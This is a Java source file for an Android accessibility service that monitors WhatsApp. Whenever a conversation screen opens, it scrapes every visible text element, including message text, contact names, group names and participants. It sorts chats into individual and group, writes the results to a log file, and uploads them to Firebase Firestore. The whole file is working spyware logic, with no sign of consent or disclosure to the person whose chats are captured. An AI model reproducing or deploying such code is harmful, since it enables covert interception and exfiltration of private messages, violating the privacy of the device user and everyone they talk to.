package com.sentinel.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sentinel.config.ServiceConfig;
import com.sentinel.utils.LoggingManager;
import com.sentinel.utils.ScreenReader;
import com.sentinel.service.FirebaseService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/**
 * Main accessibility service for monitoring WhatsApp activity.
 * This service reads and logs full screen content when entering Conversation activity.
 */
public class WhatsAppMonitoringService extends AccessibilityService {
    
    private static final String TAG = "WhatsAppMonitoringService";
    
    private LoggingManager loggingManager;
    private ServiceConfig serviceConfig;
    private FirebaseService firebaseService;
    private volatile boolean componentsInitialized = false;
    
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "WhatsApp monitoring service created");
        
        // Initialize components synchronously for now
        try {
            Log.d(TAG, "Starting component initialization...");
            initializeComponents();
            Log.d(TAG, "Component initialization completed");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing components", e);
            componentsInitialized = false;
        }
    }
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "WhatsApp monitoring service connected");
        
        // Configure accessibility service
        configureAccessibilityService();
        
        // Start monitoring
        startMonitoring();
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Process accessibility events
        processAccessibilityEvent(event);
    }
    
    @Override
    public void onInterrupt() {
        Log.w(TAG, "WhatsApp monitoring service interrupted");
        stopMonitoring();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "WhatsApp monitoring service destroyed");
        cleanup();
    }
    
    /**
     * Initialize essential service components
     */
    private void initializeComponents() {
        try {
            Log.d(TAG, "Initializing ServiceConfig...");
            serviceConfig = new ServiceConfig(this);
            Log.d(TAG, "ServiceConfig initialized");
            
            Log.d(TAG, "Initializing LoggingManager...");
            loggingManager = new LoggingManager(this);
            Log.d(TAG, "LoggingManager initialized");
            
            Log.d(TAG, "Initializing FirebaseService...");
            firebaseService = new FirebaseService(this);
            Log.d(TAG, "FirebaseService initialized");
            
            componentsInitialized = true;
            Log.d(TAG, "Essential components initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize service components", e);
            componentsInitialized = false;
        }
    }
    
    /**
     * Configure accessibility service settings
     */
    private void configureAccessibilityService() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_SELECTED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        info.packageNames = new String[]{serviceConfig.getTargetPackage()};
        
        setServiceInfo(info);
    }
    
    /**
     * Start monitoring WhatsApp activity
     */
    private void startMonitoring() {
        if (loggingManager != null) {
            loggingManager.logServiceStarted();
        }
        Log.d(TAG, "WhatsApp monitoring started");
    }
    
    /**
     * Stop monitoring WhatsApp activity
     */
    private void stopMonitoring() {
        if (loggingManager != null) {
            loggingManager.logServiceStopped();
        }
        Log.d(TAG, "WhatsApp monitoring stopped");
    }
    
    /**
     * Process accessibility events
     */
    private void processAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) {
            return;
        }
        
        // Check if components are initialized
        if (!componentsInitialized) {
            return;
        }
        
        // Check if event is from WhatsApp
        if (!serviceConfig.getTargetPackage().equals(event.getPackageName().toString())) {
            return;
        }
        
        // Check if we're in conversation activity
        if (!isConversationActivity(event)) {
            return;
        }
        
        // Scan conversation screen on every access
        Log.d(TAG, "Conversation activity detected - scanning screen");
        scanConversationScreen(event);
        
        try {
            // Log that we're processing a Conversation activity event
            Log.d(TAG, "Processing Conversation activity event - Event type: " + event.getEventType() + 
                      ", Class: " + (event.getClassName() != null ? event.getClassName() : "null"));
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event", e);
            if (loggingManager != null) {
                loggingManager.logError("event_processing", "Failed to process event: " + e.getMessage());
            }
        }
    }
    
    /**
     * Scan the conversation screen and create simple JSON with TextView elements
     */
    private void scanConversationScreen(AccessibilityEvent event) {
        try {
            Log.d(TAG, "Scanning conversation screen for TextView elements...");
            
            // Get the source node
            AccessibilityNodeInfo sourceNode = event.getSource();
            if (sourceNode == null) {
                Log.w(TAG, "Cannot read screen - source node is null");
                return;
            }
            
            // Get root node for screen reading
            AccessibilityNodeInfo rootNode = getRootNode(sourceNode);
            if (rootNode == null) {
                Log.w(TAG, "Cannot read screen - root node is null");
                sourceNode.recycle();
                return;
            }
            
            try {
                // Create simple JSON with timestamp and TextView elements
                JSONObject result = new JSONObject();
                result.put("timestamp", ScreenReader.getFormattedTimestamp());
                
                // Extract TextView elements and split them
                JSONArray textElements = extractTextViewElements(rootNode);
                
                // Detect conversation type
                boolean isIndividual = isIndividualConversation(rootNode);
                Log.d(TAG, "Conversation type detected: " + (isIndividual ? "Individual" : "Group"));
                
                // Split elements based on conversation type
                JSONArray sampleElements = new JSONArray();
                
                if (isIndividual) {
                    // Individual conversation: first text goes to "participants", rest go to sample
                    if (textElements.length() > 0) {
                        result.put("participants", textElements.get(0));
                    }
                    
                    // Remaining elements go to sample
                    for (int i = 1; i < textElements.length(); i++) {
                        sampleElements.put(textElements.get(i));
                    }
                } else {
                    // Group conversation: first text goes to "group", second text goes to "participants"
                    if (textElements.length() > 0) {
                        result.put("group", textElements.get(0));
                    }
                    if (textElements.length() > 1) {
                        result.put("participants", textElements.get(1));
                    }
                    
                    // Remaining elements go to sample
                    for (int i = 2; i < textElements.length(); i++) {
                        sampleElements.put(textElements.get(i));
                    }
                }
                
                result.put("sample", sampleElements);
                result.put("conversationType", isIndividual ? "individual" : "group");
                
                // Log the result
                Log.d(TAG, "Conversation screen scanned - found " + textElements.length() + " TextView elements");
                if (isIndividual) {
                    Log.d(TAG, "Individual conversation - Participants: " + (textElements.length() > 0 ? textElements.get(0) : "none") + ", Sample elements: " + sampleElements.length());
                } else {
                    Log.d(TAG, "Group conversation - Group: " + (textElements.length() > 0 ? textElements.get(0) : "none") + ", Participants: " + (textElements.length() > 1 ? textElements.get(1) : "none") + ", Sample elements: " + sampleElements.length());
                }
                Log.d(TAG, "=== CONVERSATION SCAN RESULT ===");
                Log.d(TAG, result.toString(2)); // Pretty print with 2-space indentation
                Log.d(TAG, "=== END CONVERSATION SCAN RESULT ===");
                
                // Log to file if logging manager is available
                if (loggingManager != null) {
                    loggingManager.logInfo("CONVERSATION_SCAN", result.toString());
                }
                
                // Store in Firebase if Firebase service is available
                if (firebaseService != null && firebaseService.isReady()) {
                    firebaseService.storeConversation(result);
                    Log.d(TAG, "Conversation data sent to Firebase Firestore");
                } else {
                    Log.w(TAG, "Firebase service not ready, conversation data not stored in Firestore");
                }
                
            } finally {
                rootNode.recycle();
                sourceNode.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error scanning conversation screen", e);
        }
    }
    
    /**
     * Check if this is an individual conversation by looking for ImageButton with "Llamada" contentDescription
     */
    private boolean isIndividualConversation(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) {
            return false;
        }
        
        return findImageButtonWithLlamada(rootNode);
    }
    
    /**
     * Recursively search for ImageButton with "Llamada" contentDescription
     */
    private boolean findImageButtonWithLlamada(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }
        
        try {
            // Check if this is an ImageButton with "Llamada" contentDescription
            if (node.getClassName() != null && 
                node.getClassName().toString().equals("android.widget.ImageButton")) {
                
                CharSequence contentDescription = node.getContentDescription();
                if (contentDescription != null && 
                    contentDescription.toString().equals("Llamada")) {
                    Log.d(TAG, "Found ImageButton with 'Llamada' contentDescription - Individual conversation detected");
                    return true;
                }
            }
            
            // Recursively search children
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    boolean found = findImageButtonWithLlamada(child);
                    child.recycle();
                    if (found) {
                        return true;
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching for ImageButton with Llamada", e);
        }
        
        return false;
    }
    
    /**
     * Extract TextView elements from the screen
     */
    private JSONArray extractTextViewElements(AccessibilityNodeInfo rootNode) throws JSONException {
        JSONArray textElements = new JSONArray();
        
        // Get all TextView elements
        List<TextViewData> textViews = collectTextViewElements(rootNode);
        
        for (TextViewData textView : textViews) {
            String text = textView.text;
            if (text != null && !text.trim().isEmpty()) {
                textElements.put(text);
            }
        }
        
        return textElements;
    }
    
    
    /**
     * Get root node from any node
     */
    private AccessibilityNodeInfo getRootNode(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) {
            return null;
        }
        
        AccessibilityNodeInfo current = nodeInfo;
        AccessibilityNodeInfo parent = current.getParent();
        
        while (parent != null) {
            AccessibilityNodeInfo temp = parent;
            parent = temp.getParent();
            if (current != nodeInfo) {
                current.recycle(); // Only recycle if it's not the original node
            }
            current = temp;
        }
        
        return current;
    }
    
    /**
     * Check if the event is from the com.whatsapp.Conversation activity
     */
    private boolean isConversationActivity(AccessibilityEvent event) {
        if (event == null) {
            return false;
        }
        
        try {
            // Get the class name from the event
            CharSequence className = event.getClassName();
            if (className != null) {
                String classNameStr = className.toString();
                boolean isConversation = classNameStr.contains("com.whatsapp.Conversation");
                
                if (isConversation) {
                    Log.d(TAG, "Conversation activity detected: " + classNameStr);
                }
                
                return isConversation;
            }
            
            return false;
            
        } catch (Exception e) {
            Log.e(TAG, "Error checking Conversation activity", e);
            return false;
        }
    }
    
    /**
     * Collect all TextView elements from the screen
     */
    private List<TextViewData> collectTextViewElements(AccessibilityNodeInfo rootNode) {
        List<TextViewData> textViews = new ArrayList<>();
        collectTextViewElementsRecursive(rootNode, textViews);
        return textViews;
    }
    
    /**
     * Recursively collect TextView elements
     */
    private void collectTextViewElementsRecursive(AccessibilityNodeInfo node, List<TextViewData> textViews) {
        if (node == null) {
            return;
        }
        
        try {
            // Check if this is a TextView
            if (node.getClassName() != null && 
                node.getClassName().toString().equals("android.widget.TextView")) {
                
                CharSequence text = node.getText();
                if (text != null && !text.toString().trim().isEmpty()) {
                    textViews.add(new TextViewData(text.toString()));
                }
            }
            
            // Recursively process children
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectTextViewElementsRecursive(child, textViews);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting TextView elements", e);
        }
    }
    
    /**
     * Helper class to store TextView data
     */
    private static class TextViewData {
        public final String text;
        
        public TextViewData(String text) {
            this.text = text;
        }
    }
    
    /**
     * Cleanup resources
     */
    private void cleanup() {
        if (loggingManager != null) {
            loggingManager.cleanup();
        }
        if (firebaseService != null) {
            firebaseService.cleanup();
        }
    }
}
